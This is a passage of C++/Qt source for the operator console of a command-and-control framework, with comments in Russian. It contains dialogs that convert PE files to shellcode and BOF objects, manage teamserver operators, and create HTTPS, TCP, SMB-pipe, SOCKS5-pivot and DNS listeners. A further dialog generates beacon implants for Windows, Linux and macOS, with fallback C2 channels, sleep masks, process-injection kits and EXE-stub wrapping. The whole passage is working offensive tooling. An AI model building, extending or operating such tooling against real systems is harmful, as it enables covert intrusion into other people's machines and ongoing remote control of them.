                "Specify input PE and output .bin paths.");
            return;
        }

        QStringList args;
        args << tbInput->text()
             << "-o" << tbOutput->text();
        if (cbArch->currentIndex() > 0) args << "-a" << cbArch->currentText();
        args << "--exit" << cbExit->currentText();
        if (!tbExport->text().isEmpty())    args << "-e"     << tbExport->text();
        if (!tbNetClass->text().isEmpty())  args << "-c"     << tbNetClass->text();
        if (!tbNetMethod->text().isEmpty()) args << "-m"     << tbNetMethod->text();
        if (!tbArgs->text().isEmpty())      args << "--args" << tbArgs->text();
        if (cbEmitBof->isChecked()) {
            QFileInfo fi(tbOutput->text());
            QString bofPath = fi.path() + "/" + fi.completeBaseName() + ".o";
            args << "--bof" << QDir::toNativeSeparators(bofPath);
        }

        log("> scelot.exe " + args.join(' '), QColor("#60a5fa"));
        btnGen->setEnabled(false);

        auto* proc = new QProcess(dlg);
        proc->setWorkingDirectory(QFileInfo(scelotExe).path());
        proc->setProcessChannelMode(QProcess::MergedChannels);

        QObject::connect(proc, &QProcess::readyReadStandardOutput, dlg, [proc, log]() {
            QByteArray out = proc->readAllStandardOutput();
            log(QString::fromLocal8Bit(out).trimmed());
        });
        QObject::connect(proc, qOverload<int, QProcess::ExitStatus>(&QProcess::finished),
            dlg, [proc, btnGen, log](int code, QProcess::ExitStatus) {
                log(QString("[exit %1]").arg(code),
                    code == 0 ? QColor("#10b981") : QColor("#f87171"));
                btnGen->setEnabled(true);
                proc->deleteLater();
            });

        proc->start(scelotExe, args);
        if (!proc->waitForStarted(3000)) {
            log("[!] failed to start scelot.exe", QColor("#f87171"));
            btnGen->setEnabled(true);
            proc->deleteLater();
        }
    });

    dlg->show();
}

void MainWindow::onServerStdout() {
    if (!server_proc_) return;
    auto text = QString::fromUtf8(server_proc_->readAllStandardOutput());
    appendLogsText(logs_, tabs_, text, QColor("#d7e3f4"));
}

void MainWindow::onServerStderr() {
    if (!server_proc_) return;
    auto text = QString::fromUtf8(server_proc_->readAllStandardError());
    appendLogsText(logs_, tabs_, text, QColor("#fb923c"));
}

void MainWindow::onServerFinished(int exitCode, QProcess::ExitStatus) {
    appendLogsText(logs_, tabs_,
        QString("[teamserver exited: code %1]\n").arg(exitCode),
        QColor("#94a3b8"));
    statusBar()->showMessage("Teamserver stopped");
    start_srv_act_->setEnabled(true);
    stop_srv_act_->setEnabled(false);
    server_proc_->deleteLater(); server_proc_ = nullptr;
    tabs_->setTabText(6, "Logs");
}

void MainWindow::closeEvent(QCloseEvent* e) {
    if (server_proc_ && server_proc_->state() != QProcess::NotRunning) {
        server_proc_->terminate();
        server_proc_->waitForFinished(3000);
        if (server_proc_->state() != QProcess::NotRunning)
            server_proc_->kill();
    }
    e->accept();
}

void MainWindow::reconnect() {
    LoginDialog dlg(this);
    dlg.prefill(login_info_);
    if (dlg.exec() != QDialog::Accepted) return;
    login_info_ = dlg.info();
    statusBar()->showMessage("Connecting…");
    client_->connectToServer(login_info_.host, login_info_.port,
                             login_info_.username, login_info_.password,
                             login_info_.ca_file, login_info_.client_cert,
                             login_info_.client_key);
}

void MainWindow::onManageOperators() {
    if (current_role_ != "admin") {
        QMessageBox::warning(this, "Operators",
            "Administrators only.");
        return;
    }

    auto* dlg = new QDialog(this);
    dlg->setWindowTitle("Manage Operators");
    dlg->setMinimumSize(560, 360);

    auto* table = new QTableWidget(0, 4, dlg);
    table->setHorizontalHeaderLabels({"ID", "Username", "Role", "Created"});
    table->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);
    table->verticalHeader()->setVisible(false);
    table->setEditTriggers(QAbstractItemView::NoEditTriggers);
    table->setSelectionBehavior(QAbstractItemView::SelectRows);
    table->setSelectionMode(QAbstractItemView::SingleSelection);

    auto* refreshBtn = new QPushButton("Refresh", dlg);
    auto* addBtn     = new QPushButton("Add…", dlg);
    auto* pwdBtn     = new QPushButton("Set password…", dlg);
    auto* delBtn     = new QPushButton("Delete", dlg);
    auto* closeBtn   = new QPushButton("Close", dlg);

    auto* btnRow = new QHBoxLayout;
    btnRow->addWidget(refreshBtn);
    btnRow->addWidget(addBtn);
    btnRow->addWidget(pwdBtn);
    btnRow->addWidget(delBtn);
    btnRow->addStretch();
    btnRow->addWidget(closeBtn);

    auto* lay = new QVBoxLayout(dlg);
    lay->addWidget(table);
    lay->addLayout(btnRow);

    auto fillRows = [table](const QVector<OperatorRowSrv>& rows) {
        table->setRowCount(rows.size());
        for (int i = 0; i < rows.size(); ++i) {
            const auto& o = rows[i];
            table->setItem(i, 0, new QTableWidgetItem(QString::number(o.id)));
            table->setItem(i, 1, new QTableWidgetItem(o.username));
            table->setItem(i, 2, new QTableWidgetItem(o.role));
            QString ts = o.created_at
                ? QDateTime::fromSecsSinceEpoch(static_cast<qint64>(o.created_at))
                      .toString("yyyy-MM-dd hh:mm")
                : QString("—");
            table->setItem(i, 3, new QTableWidgetItem(ts));
        }
    };

    auto opsConn = connect(client_, &ServerClient::operatorsReceived,
                           dlg, fillRows);

    auto actionConn = connect(client_, &ServerClient::operatorActionResult,
        dlg, [this, dlg](quint64, bool ok, const QString& msg) {
            if (!ok) {
                QMessageBox::warning(dlg, "Operators", msg);
            }
            client_->listOperators();
        });

    connect(refreshBtn, &QPushButton::clicked,
            dlg, [this]{ client_->listOperators(); });

    connect(addBtn, &QPushButton::clicked, dlg, [this, dlg]{
        auto* d = new QDialog(dlg);
        d->setWindowTitle("Add operator");
        d->setMinimumWidth(320);
        auto* userE = new QLineEdit(d);
        auto* passE = new QLineEdit(d);
        passE->setEchoMode(QLineEdit::Password);
        auto* roleC = new QComboBox(d);
        roleC->addItems({"operator", "admin"});

        auto* form = new QFormLayout;
        form->addRow("Username:", userE);
        form->addRow("Password:", passE);
        form->addRow("Role:",     roleC);

        auto* bb = new QDialogButtonBox(QDialogButtonBox::Ok | QDialogButtonBox::Cancel, d);
        connect(bb, &QDialogButtonBox::accepted, d, &QDialog::accept);
        connect(bb, &QDialogButtonBox::rejected, d, &QDialog::reject);

        auto* dl = new QVBoxLayout(d);
        dl->addLayout(form);
        dl->addWidget(bb);

        if (d->exec() != QDialog::Accepted) { d->deleteLater(); return; }
        const QString user = userE->text().trimmed();
        const QString pass = passE->text();
        const QString role = roleC->currentText();
        d->deleteLater();

        if (user.isEmpty() || pass.isEmpty()) {
            QMessageBox::warning(dlg, "Add operator",
                "Username and password are required.");
            return;
        }
        client_->addOperator(user, pass, role);
    });

    connect(pwdBtn, &QPushButton::clicked, dlg, [this, dlg, table]{
        auto idx = table->currentRow();
        if (idx < 0) return;
        auto idItem = table->item(idx, 0);
        auto userItem = table->item(idx, 1);
        if (!idItem || !userItem) return;
        const quint64 id = idItem->text().toULongLong();
        const QString user = userItem->text();

        auto* d = new QDialog(dlg);
        d->setWindowTitle(QString("Set password for '%1'").arg(user));
        d->setMinimumWidth(320);
        auto* p1 = new QLineEdit(d); p1->setEchoMode(QLineEdit::Password);
        auto* p2 = new QLineEdit(d); p2->setEchoMode(QLineEdit::Password);

        auto* form = new QFormLayout;
        form->addRow("New password:",     p1);
        form->addRow("Confirm password:", p2);

        auto* bb = new QDialogButtonBox(QDialogButtonBox::Ok | QDialogButtonBox::Cancel, d);
        connect(bb, &QDialogButtonBox::accepted, d, &QDialog::accept);
        connect(bb, &QDialogButtonBox::rejected, d, &QDialog::reject);

        auto* dl = new QVBoxLayout(d);
        dl->addLayout(form);
        dl->addWidget(bb);

        if (d->exec() != QDialog::Accepted) { d->deleteLater(); return; }
        const QString pass1 = p1->text();
        const QString pass2 = p2->text();
        d->deleteLater();

        if (pass1.isEmpty()) {
            QMessageBox::warning(dlg, "Set password", "Password cannot be empty.");
            return;
        }
        if (pass1 != pass2) {
            QMessageBox::warning(dlg, "Set password", "Passwords do not match.");
            return;
        }
        client_->setOperatorPassword(id, pass1);
    });

    connect(delBtn, &QPushButton::clicked, dlg, [this, dlg, table]{
        auto idx = table->currentRow();
        if (idx < 0) return;
        auto idItem = table->item(idx, 0);
        auto userItem = table->item(idx, 1);
        if (!idItem || !userItem) return;
        const quint64 id = idItem->text().toULongLong();
        const QString user = userItem->text();
        if (QMessageBox::question(dlg, "Delete operator",
                QString("Delete operator '%1' (id=%2)?").arg(user).arg(id))
            != QMessageBox::Yes) return;
        client_->delOperator(id);
    });

    connect(closeBtn, &QPushButton::clicked, dlg, &QDialog::accept);

    connect(dlg, &QDialog::finished, this, [opsConn, actionConn](int) {
        QObject::disconnect(opsConn);
        QObject::disconnect(actionConn);
    });

    client_->listOperators();
    dlg->exec();
    dlg->deleteLater();
}

void MainWindow::onNewListener() {
    auto* dlg = new QDialog(this);
    dlg->setWindowTitle("New Listener");
    dlg->setMinimumWidth(400);

    // Выбор типа
    auto* kindCombo = new QComboBox(dlg);
    kindCombo->addItems({"HTTPS", "TCP (raw)", "SMB (named pipe)", "Pivot (SOCKS5)", "DNS (UDP)"});

    auto* nameEdit = new QLineEdit(dlg);
    nameEdit->setPlaceholderText("listener-1");

    // TCP / Pivot / HTTPS fields
    auto* bindEdit  = new QLineEdit("0.0.0.0", dlg);
    auto* portEdit  = new QLineEdit("443", dlg);
    portEdit->setMaximumWidth(90);

    // Pivot extra
    auto* pivotPortEdit = new QLineEdit("4446", dlg);
    pivotPortEdit->setMaximumWidth(90);
    auto* socksPortEdit = new QLineEdit("1080", dlg);
    socksPortEdit->setMaximumWidth(90);

    // SMB field
    auto* pipeEdit = new QLineEdit("co2h", dlg);

    // DNS field
    auto* domainEdit = new QLineEdit(dlg);
    domainEdit->setPlaceholderText("c2.example.com");

    // HTTPS: malleable profile path (optional)
    auto* profileEdit = new QLineEdit(dlg);
    profileEdit->setPlaceholderText("profiles/default.toml  (empty = built-in profile)");
    auto* profileBrowse = new QPushButton("…", dlg);
    profileBrowse->setMaximumWidth(30);
    auto* profileRow = new QWidget(dlg);
    { auto* h = new QHBoxLayout(profileRow); h->setContentsMargins(0,0,0,0);
      h->addWidget(profileEdit); h->addWidget(profileBrowse); }
    connect(profileBrowse, &QPushButton::clicked, dlg, [profileEdit, dlg]{
        QString f = QFileDialog::getOpenFileName(dlg, "Malleable profile",
            QApplication::applicationDirPath() + "/profiles",
            "TOML profiles (*.toml);;All files (*.*)");
        if (!f.isEmpty()) profileEdit->setText(f);
    });

    auto* form = new QFormLayout;
    form->addRow("Kind:",       kindCombo);
    form->addRow("Name:",       nameEdit);

    // Добавляем все строки; скрывать будем через setVisible на виджете и лейбле
    auto addHideable = [&](const QString& label, QWidget* w) -> QLabel* {
        auto* lbl = new QLabel(label, dlg);
        form->addRow(lbl, w);
        return lbl;
    };

    auto* lblBind      = addHideable("Bind host:", bindEdit);
    auto* lblPort      = addHideable("Port:",      portEdit);
    auto* lblSocksPort = addHideable("SOCKS port:", socksPortEdit);
    auto* lblPivotPort = addHideable("Pivot port:", pivotPortEdit);
    auto* lblPipe      = addHideable("Pipe name:", pipeEdit);
    auto* lblDomain    = addHideable("C2 domain:", domainEdit);
    auto* lblProfile   = addHideable("Profile:",   profileRow);

    auto updateFields = [&](int idx) {
        const bool isHttps = (idx == 0);
        const bool isTcp   = (idx == 1);
        const bool isSmb   = (idx == 2);
        const bool isPivot = (idx == 3);
        const bool isDns   = (idx == 4);
        lblBind->setVisible(isHttps || isTcp || isPivot || isDns);
        bindEdit->setVisible(isHttps || isTcp || isPivot || isDns);
        lblPort->setVisible(isHttps || isTcp || isDns);
        portEdit->setVisible(isHttps || isTcp || isDns);
        if (isTcp)   { portEdit->setText("4444"); }
        if (isHttps) { portEdit->setText("443");  }
        if (isDns)   { portEdit->setText("53");   }
        lblSocksPort->setVisible(isPivot);
        socksPortEdit->setVisible(isPivot);
        lblPivotPort->setVisible(isPivot);
        pivotPortEdit->setVisible(isPivot);
        lblPipe->setVisible(isSmb);
        pipeEdit->setVisible(isSmb);
        lblDomain->setVisible(isDns);
        domainEdit->setVisible(isDns);
        lblProfile->setVisible(isHttps);
        profileRow->setVisible(isHttps);
        dlg->adjustSize();
    };

    connect(kindCombo, QOverload<int>::of(&QComboBox::currentIndexChanged),
            dlg, [updateFields](int i){ updateFields(i); });
    updateFields(0); // начальное состояние — HTTPS

    auto* buttons = new QDialogButtonBox(
        QDialogButtonBox::Ok | QDialogButtonBox::Cancel, dlg);
    connect(buttons, &QDialogButtonBox::accepted, dlg, &QDialog::accept);
    connect(buttons, &QDialogButtonBox::rejected, dlg, &QDialog::reject);

    auto* v = new QVBoxLayout(dlg);
    v->addLayout(form);
    v->addWidget(buttons);

    if (dlg->exec() != QDialog::Accepted) { dlg->deleteLater(); return; }

    const int    kind = kindCombo->currentIndex();
    const QString name = nameEdit->text().trimmed();
    dlg->deleteLater();

    if (name.isEmpty()) {
        QMessageBox::warning(this, "New Listener", "Name is required.");
        return;
    }

    if (kind == 0) { // HTTPS
        const QString bind    = bindEdit->text().trimmed();
        const QString profile = profileEdit->text().trimmed();
        bool ok = false;
        const quint32 port = portEdit->text().trimmed().toUInt(&ok);
        if (bind.isEmpty() || !ok || port == 0 || port > 65535) {
            QMessageBox::warning(this, "New Listener",
                "Bind host is required, port must be 1-65535.");
            return;
        }
        client_->addHttpsListener(name, bind, static_cast<quint16>(port), profile);
        appendLogsText(logs_, tabs_,
            QString("[listener] requested https '%1' %2:%3\n").arg(name, bind).arg(port),
            QColor("#a78bfa"));

    } else if (kind == 1) { // TCP
        const QString bind = bindEdit->text().trimmed();
        bool ok = false;
        const quint32 port = portEdit->text().trimmed().toUInt(&ok);
        if (bind.isEmpty() || !ok || port == 0 || port > 65535) {
            QMessageBox::warning(this, "New Listener",
                "Bind host is required, port must be 1-65535.");
            return;
        }
        client_->addTcpListener(name, bind, static_cast<quint16>(port));
        appendLogsText(logs_, tabs_,
            QString("[listener] requested tcp '%1' %2:%3\n").arg(name, bind).arg(port),
            QColor("#a78bfa"));

    } else if (kind == 2) { // SMB
        const QString pipe = pipeEdit->text().trimmed();
        if (pipe.isEmpty()) {
            QMessageBox::warning(this, "New Listener", "Pipe name is required.");
            return;
        }
        client_->addSmbListener(name, pipe);
        appendLogsText(logs_, tabs_,
            QString("[listener] requested smb '%1' pipe=%2\n").arg(name, pipe),
            QColor("#a78bfa"));

    } else if (kind == 3) { // Pivot
        const QString bind = bindEdit->text().trimmed();
        bool okS = false, okP = false;
        const quint32 sport = socksPortEdit->text().trimmed().toUInt(&okS);
        const quint32 pport = pivotPortEdit->text().trimmed().toUInt(&okP);
        if (bind.isEmpty() || !okS || sport == 0 || sport > 65535 ||
            !okP || pport == 0 || pport > 65535) {
            QMessageBox::warning(this, "New Listener",
                "Bind host is required, ports must be 1-65535.");
            return;
        }
        if (sport == pport) {
            QMessageBox::warning(this, "New Listener",
                "SOCKS port and Pivot port must be different.");
            return;
        }
        client_->addPivotListener(name, bind,
                                  static_cast<quint16>(sport),
                                  static_cast<quint16>(pport));
        appendLogsText(logs_, tabs_,
            QString("[listener] requested pivot '%1' bind=%2 socks=%3 pivot=%4\n")
                .arg(name, bind).arg(sport).arg(pport),
            QColor("#a78bfa"));

    } else { // kind == 4: DNS
        const QString bind   = bindEdit->text().trimmed();
        const QString domain = domainEdit->text().trimmed();
        bool ok = false;
        const quint32 port = portEdit->text().trimmed().toUInt(&ok);
        if (bind.isEmpty() || !ok || port == 0 || port > 65535) {
            QMessageBox::warning(this, "New Listener",
                "Bind host is required, port must be 1-65535.");
            return;
        }
        if (domain.isEmpty()) {
            QMessageBox::warning(this, "New Listener",
                "C2 domain is required (e.g. c2.example.com).");
            return;
        }
        client_->addDnsListener(name, bind, static_cast<quint16>(port), domain);
        appendLogsText(logs_, tabs_,
            QString("[listener] requested dns '%1' %2:%3 domain=%4\n")
                .arg(name, bind).arg(port).arg(domain),
            QColor("#a78bfa"));
    }

    QTimer::singleShot(700, this, &MainWindow::refreshData);
}

void MainWindow::onGenerateArtifact() {
    auto* dlg = new QDialog(this);
    dlg->setWindowTitle("Generate Artifact");
    dlg->setMinimumWidth(460);

    // Listener selector (имя + kind из модели).
    auto* listenerCombo = new QComboBox(dlg);
    // Fallback: ручной ввод ключа если listener'ов нет.
    auto* keyEdit = new QLineEdit(dlg);
    keyEdit->setPlaceholderText("64 hex chars");

    const int nL = listeners_model_->rowCount({});
    for (int i = 0; i < nL; ++i) {
        const auto* lr = listeners_model_->row(i);
        if (!lr) continue;
        // pivot и socks5 — реле для оператора, у них нет listener-ключа beacon'а.
        if (lr->kind == "pivot" || lr->kind == "socks5") continue;
        listenerCombo->addItem(
            QString("%1 (%2)").arg(lr->name, lr->kind),
            QVariant::fromValue(i));
    }
    // Если есть listener'ы — не нужен ручной ввод ключа.
    const bool hasListeners = listenerCombo->count() > 0;
    auto* lblKey = new QLabel("Listener key:", dlg);
    keyEdit->setVisible(!hasListeners);
    lblKey->setVisible(!hasListeners);
    listenerCombo->setVisible(hasListeners);
    auto* lblListener = new QLabel("Listener:", dlg);
    lblListener->setVisible(hasListeners);

    // Default host = тот IP/имя, по которому оператор подключился к teamserver'у.
    // Beacon должен доходить до listener'а — он живёт на той же машине, что и
    // teamserver, поэтому подставляем именно адрес подключения, а не 127.0.0.1
    // (последний пригоден только для локального теста).
    QString defaultHost = login_info_.host.isEmpty() ? "127.0.0.1"
                                                     : login_info_.host;
    auto* host = new QLineEdit(defaultHost, dlg);
    auto* port = new QLineEdit("443", dlg);
    port->setMaximumWidth(80);
    // Для SMB: поле pipe name (заполняется автоматически из listener'а).
    auto* pipe = new QLineEdit("co2h", dlg);
    pipe->setMaximumWidth(180);
    // Для DNS: C2 domain (заполняется из listener'а).
    auto* domainA    = new QLineEdit(dlg);
    domainA->setPlaceholderText("c2.example.com");
    auto* lblHost     = new QLabel("C2 host:", dlg);
    auto* lblPort     = new QLabel("C2 port:", dlg);
    auto* lblPipe     = new QLabel("Pipe name:", dlg);
    auto* lblDomainA  = new QLabel("C2 domain:", dlg);
    auto* parentIdEdit = new QLineEdit(dlg);
    parentIdEdit->setPlaceholderText("hex-id of parent beacon (optional)");

    // Fallback C2 channels — до 4 резервных каналов (host:port[:uri], по одному на строку).
    auto* fallbackEdit = new QPlainTextEdit(dlg);
    fallbackEdit->setPlaceholderText("host:port[:uri]  (up to 4 channels, one per line)");
    fallbackEdit->setMaximumHeight(80);

    auto* outEdit   = new QLineEdit(dlg);
    outEdit->setPlaceholderText("Select output file…");

    auto* osCb = new QComboBox(dlg);
    osCb->addItem("Windows", QString("windows"));
    osCb->addItem("Linux",   QString("linux"));
    osCb->addItem("macOS",   QString("macos"));

    auto* fmt = new QComboBox(dlg);
    fmt->addItem("EXE", QString("exe"));
    fmt->addItem("DLL", QString("dll"));

    auto* arch = new QComboBox(dlg);
    arch->addItem("x64", QString("64"));
    arch->addItem("x86", QString("32"));

    auto* lblFmt  = new QLabel("Format:", dlg);
    auto* lblArch = new QLabel("Architecture:", dlg);

    // Sleep mask (forward declaration for osCb lambda capture).
    auto* maskEdit = new QLineEdit(dlg);
    maskEdit->setPlaceholderText("(built-in default)");
    auto* maskRow  = new QWidget(dlg);
    auto* lblMask  = new QLabel("Sleep mask:", dlg);

    // Process inject kit (forward declaration for osCb lambda capture).
    auto* kitEdit = new QLineEdit(dlg);
    kitEdit->setPlaceholderText("(built-in default)");
    auto* kitRow  = new QWidget(dlg);
    auto* lblKit  = new QLabel("Inject kit:", dlg);

    // Artifact Kit EXE-stub (forward declaration for osCb lambda capture).
    // Без выбора - артефакт пишется как обычный пропатченный бикон (как раньше).
    // С выбором - пропатченный бикон встраивается в .co2pay секцию stub-EXE.
    // Поле имеет смысл только для Windows + Format=DLL, поэтому по умолчанию
    // скрыто; видимость управляется osCb/fmt-listener'ами ниже.
    auto* stubEdit = new QLineEdit(dlg);
    stubEdit->setPlaceholderText("(none -- write beacon directly)");
    auto* stubRow  = new QWidget(dlg);
    auto* lblStub  = new QLabel("Wrap in EXE stub:", dlg);
    stubRow->setVisible(false);
    lblStub->setVisible(false);

    // При смене ОС — обновить форматы и архитектуры.
    connect(osCb, QOverload<int>::of(&QComboBox::currentIndexChanged), dlg,
            [osCb, fmt, arch, lblFmt, maskRow, lblMask, maskEdit,
             kitRow, lblKit, kitEdit, stubRow, lblStub, stubEdit](int) {
        QString os = osCb->currentData().toString();
        fmt->clear();
        arch->clear();
        // Sleep mask, inject kit и stub-wrap доступны только для Windows.
        bool showMask = (os == "windows");
        maskRow->setVisible(showMask);
        lblMask->setVisible(showMask);
        if (!showMask) maskEdit->clear();
        kitRow->setVisible(showMask);
        lblKit->setVisible(showMask);
        if (!showMask) kitEdit->clear();
        // Stub-row пока скрываем; реальная видимость определится fmt-listener'ом
        // после заполнения combobox'а (зависит от format: DLL vs EXE).
        stubRow->setVisible(false);
        lblStub->setVisible(false);
        if (!showMask) stubEdit->clear();
        if (os == "linux") {
            fmt->addItem("ELF", QString("elf"));
            fmt->addItem("SO",  QString("so"));
            arch->addItem("x64",   QString("x64"));
            arch->addItem("ARM64", QString("arm64"));
            arch->addItem("ARM32", QString("arm32"));
        } else if (os == "macos") {
            fmt->addItem("Mach-O", QString("macho"));
            fmt->addItem("DYLIB",  QString("dylib"));
            arch->addItem("Universal (arm64 + x64)", QString("universal"));
            arch->addItem("ARM64 (Apple Silicon)",   QString("arm64"));
            arch->addItem("x64 (Intel)",             QString("x64"));
        } else {
            fmt->addItem("EXE", QString("exe"));
            fmt->addItem("DLL", QString("dll"));
            arch->addItem("x64", QString("64"));
            arch->addItem("x86", QString("32"));
        }

        // После заполнения fmt - явно установим видимость stub-row.
        // (currentIndexChanged может не сработать на первое заполнение addItem'ом).
        bool stubAllowed = showMask && (fmt->currentData().toString() == "dll");
        stubRow->setVisible(stubAllowed);
        lblStub->setVisible(stubAllowed);
    });

    auto* browseBtn = new QPushButton("…", dlg);
    browseBtn->setFixedWidth(28);
    connect(browseBtn, &QPushButton::clicked, dlg, [outEdit, dlg, osCb, fmt]{
        // Фильтр расширений на основе выбранной ОС и формата
        QString osVal  = osCb->currentData().toString();
        QString fmtVal = fmt->currentData().toString();
        QString filter;
        if (osVal == "linux") {
            filter = (fmtVal == "so") ? "Shared library (*.so);;All (*)" : "ELF binary (*);;All (*)";
        } else if (osVal == "macos") {
            filter = (fmtVal == "dylib") ? "Dynamic library (*.dylib);;All (*)" : "Mach-O binary (*);;All (*)";
        } else {
            filter = (fmtVal == "dll") ? "DLL (*.dll);;All (*)" : "Executable (*.exe);;All (*)";
        }
        auto path = QFileDialog::getSaveFileName(dlg, "Output file", {}, filter);
        if (!path.isEmpty()) outEdit->setText(path);
    });

    connect(fmt, &QComboBox::currentIndexChanged, dlg, [fmt, outEdit, osCb,
                                                        stubRow, lblStub, stubEdit]{
        QString cur = outEdit->text();
        QString ext = fmt->currentData().toString();
        if (!cur.isEmpty()) {
            // Заменяем любое существующее расширение на выбранный формат
            int dot = cur.lastIndexOf('.');
            if (dot > 0 && dot > cur.lastIndexOf('/') && dot > cur.lastIndexOf('\\'))
                cur = cur.left(dot + 1) + ext;
            outEdit->setText(cur);
        }
        // Stub-обёртка имеет смысл только для DLL-бикона (внутри stub - LoadLibraryW).
        // Для EXE-формата прячем поле полностью.
        bool stubAllowed = (osCb->currentData().toString() == "windows" && ext == "dll");
        stubRow->setVisible(stubAllowed);
        lblStub->setVisible(stubAllowed);
        if (!stubAllowed) stubEdit->clear();
    });

    // При выборе listener'а заполняем поля автоматически.
    auto applyListener = [&](int comboIdx) {
        if (comboIdx < 0 || comboIdx >= nL) return;
        const auto* lr = listeners_model_->row(comboIdx);
        if (!lr) return;
        const bool isSmbKind = (lr->kind == "smb");
        const bool isDnsKind = (lr->kind == "dns");
        lblHost->setVisible(!isDnsKind);
        host->setVisible(!isDnsKind);
        lblPort->setVisible(!isSmbKind && !isDnsKind);
        port->setVisible(!isSmbKind && !isDnsKind);
        lblPipe->setVisible(isSmbKind);
        pipe->setVisible(isSmbKind);
        lblDomainA->setVisible(isDnsKind);
        domainA->setVisible(isDnsKind);
        if (isSmbKind) {
            lblHost->setText("Server host:");
            // bind = "\\.\pipe\<name>" → вытащим имя пайпа
            QString bind = lr->bind;
            const QString prefix = "\\\\.\\pipe\\";
            if (bind.startsWith(prefix))
                pipe->setText(bind.mid(prefix.size()));
            else
                pipe->setText(bind);
        } else if (isDnsKind) {
            // DNS: domain из lr->domain, UDP port из bind (для справки не нужен в artifact-gen).
            domainA->setText(lr->domain);
        } else {
            lblHost->setText("C2 host:");
            // Для TCP/HTTPS: bind = "host:port" — port забираем,
            // а host НЕ трогаем (там обычно 0.0.0.0 — бесполезно для beacon'а;
            // оставляем дефолт = адрес подключения оператора, см. defaultHost).
            QStringList parts = lr->bind.split(':');
            if (parts.size() >= 2) {
                // bind может быть "host:port (pivot:N)" — берём только ведущие цифры.
                QString tok = parts[1].trimmed();
                int n = 0;
                while (n < tok.size() && tok[n].isDigit()) ++n;
                if (n > 0) port->setText(tok.left(n));
            }
            // Если bind задан конкретным IP (не 0.0.0.0) — подставим его.
            if (lr->kind == "tcp" && parts.size() == 2) {
                const QString& bindHost = parts[0];
                if (!bindHost.isEmpty() && bindHost != "0.0.0.0" && bindHost != "::") {
                    host->setText(bindHost);
                }
            }
        }
        dlg->adjustSize();
    };

    if (hasListeners) {
        connect(listenerCombo, QOverload<int>::of(&QComboBox::currentIndexChanged),
                dlg, [applyListener](int i){ applyListener(i); });
        applyListener(0);
    }

    // DNS: скрываем по умолчанию — applyListener покажет если нужно.
    lblDomainA->setVisible(false);
    domainA->setVisible(false);

    auto* form = new QFormLayout;
    form->addRow(lblListener,    listenerCombo);
    form->addRow(lblKey,         keyEdit);
    form->addRow(lblHost,        host);
    form->addRow(lblPort,        port);
    form->addRow(lblPipe,        pipe);
    form->addRow(lblDomainA,     domainA);
    form->addRow("Parent beacon:", parentIdEdit);
    form->addRow("Fallback C2:",  fallbackEdit);
    form->addRow("Target OS:",   osCb);
    form->addRow(lblFmt,         fmt);
    form->addRow(lblArch,        arch);

    // Sleep mask: layout + buttons (widgets declared earlier for osCb lambda).
    {
        auto* maskH = new QHBoxLayout(maskRow);
        maskH->setContentsMargins(0, 0, 0, 0);
        auto* maskBrowse = new QPushButton("...", dlg);
        maskBrowse->setFixedWidth(28);
        auto* maskClear  = new QPushButton("X", dlg);
        maskClear->setFixedWidth(22);
        maskClear->setToolTip("Reset to built-in");
        maskH->addWidget(maskEdit);
        maskH->addWidget(maskBrowse);
        maskH->addWidget(maskClear);
        connect(maskBrowse, &QPushButton::clicked, dlg, [maskEdit, dlg]{
            auto path = QFileDialog::getOpenFileName(dlg, "Select sleep mask .bin",
                            {}, "Sleep mask (*.bin);;All (*)");
            if (!path.isEmpty()) maskEdit->setText(path);
        });
        connect(maskClear, &QPushButton::clicked, dlg, [maskEdit]{
            maskEdit->clear();
        });
    }
    form->addRow(lblMask, maskRow);

    // Process inject kit: layout + buttons (widgets declared earlier for osCb lambda).
    {
        auto* kitH = new QHBoxLayout(kitRow);
        kitH->setContentsMargins(0, 0, 0, 0);
        auto* kitBrowse = new QPushButton("...", dlg);
        kitBrowse->setFixedWidth(28);
        auto* kitClear  = new QPushButton("X", dlg);
        kitClear->setFixedWidth(22);
        kitClear->setToolTip("Reset to built-in");
        kitH->addWidget(kitEdit);
        kitH->addWidget(kitBrowse);
        kitH->addWidget(kitClear);
        connect(kitBrowse, &QPushButton::clicked, dlg, [kitEdit, dlg]{
            auto path = QFileDialog::getOpenFileName(dlg, "Select inject kit .bin",
                            {}, "Inject kit (*.bin);;All (*)");
            if (!path.isEmpty()) kitEdit->setText(path);
        });
        connect(kitClear, &QPushButton::clicked, dlg, [kitEdit]{
            kitEdit->clear();
        });
    }
    form->addRow(lblKit, kitRow);

    // Artifact-Kit stub: layout + buttons.
    {
        auto* stubH = new QHBoxLayout(stubRow);
        stubH->setContentsMargins(0, 0, 0, 0);
        auto* stubBrowse = new QPushButton("...", dlg);
        stubBrowse->setFixedWidth(28);
        auto* stubClear  = new QPushButton("X", dlg);
        stubClear->setFixedWidth(22);
        stubClear->setToolTip("Reset: write beacon directly without stub");
        stubH->addWidget(stubEdit);
        stubH->addWidget(stubBrowse);
        stubH->addWidget(stubClear);
        connect(stubBrowse, &QPushButton::clicked, dlg, [stubEdit, dlg]{
            auto path = QFileDialog::getOpenFileName(dlg, "Select Artifact stub .exe",
                            {}, "Stub executable (*.exe);;All (*)");
            if (!path.isEmpty()) stubEdit->setText(path);
        });
        connect(stubClear, &QPushButton::clicked, dlg, [stubEdit]{
            stubEdit->clear();
        });
    }
    form->addRow(lblStub, stubRow);

    auto* outRow = new QWidget(dlg);
    auto* outH   = new QHBoxLayout(outRow);
    outH->setContentsMargins(0, 0, 0, 0);
    outH->addWidget(outEdit);
    outH->addWidget(browseBtn);
    form->addRow("Output file:", outRow);

    auto* buttons = new QDialogButtonBox(QDialogButtonBox::Ok | QDialogButtonBox::Cancel, dlg);
    connect(buttons, &QDialogButtonBox::accepted, dlg, &QDialog::accept);
    connect(buttons, &QDialogButtonBox::rejected, dlg, &QDialog::reject);

    auto* v = new QVBoxLayout(dlg);
    v->addLayout(form);
    v->addWidget(buttons);

    if (dlg->exec() != QDialog::Accepted) { dlg->deleteLater(); return; }

    // Собираем параметры.
    QString keyVal, pubkeyVal, kindVal, hostVal, portVal, pipeVal, domainVal, parentIdVal, fmtVal, archVal, outVal;
    fmtVal  = fmt->currentData().toString();
    archVal = arch->currentData().toString();   // "64" или "32"
    outVal  = outEdit->text().trimmed();

    const ListenerRow* lr = nullptr;
    if (hasListeners) {
        const int idx = listenerCombo->currentIndex();
        if (idx >= 0 && idx < nL) {
            lr = listeners_model_->row(idx);
            if (lr) {
                keyVal    = lr->key_hex;
                pubkeyVal = lr->pubkey_hex;
                kindVal   = lr->kind;
            }
        }
    } else {
        keyVal  = keyEdit->text().trimmed();
